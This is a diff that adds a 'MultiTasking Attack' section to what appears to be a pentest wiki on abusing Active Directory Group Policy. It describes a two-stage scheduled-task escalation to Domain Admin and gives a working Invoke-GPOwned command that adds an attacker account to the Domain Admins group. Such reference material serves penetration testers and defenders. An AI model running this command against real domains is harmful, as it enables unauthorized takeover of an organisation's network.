@@ -71,6 +71,19 @@ Step 2: add the user to the local admin group
 
 `Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Update > Group name :  > Members: Add: `
 
+### MultiTasking Attack
+
+The MultiTasking attack escalates to Domain Admin when controlling a GPO linked to an OU by using a two-stage scheduled task approach.
+The attack creates an immediate task that executes as NT Authority\SYSTEM, by using the SYSVOL as an open share which then registers a second scheduled task running with "highest available privileges". When a domain admin is logged into the workstation, the second task executes in that context, adding the attacker to the domain admin group.
+
+::: tabs
+=== Windows
+Using [Invoke-GPOwned](https://github.com/n0troot/Invoke-GPOwned):
+
+```powershell
+Invoke-GPOwned -GPOName "Target_GPO_Name"  -LoadDLL <AD Module DLL> -User <Attacker> -DA -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -SecondTaskXMLPath ".\wsadd.xml" -Author <DA User> -SecondXMLCMD "/r net group 'Domain Admins' <Attacker> /add /dom"
+```
+
 ### Force Group Policy update
 
 Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: `gpupdate /force`.
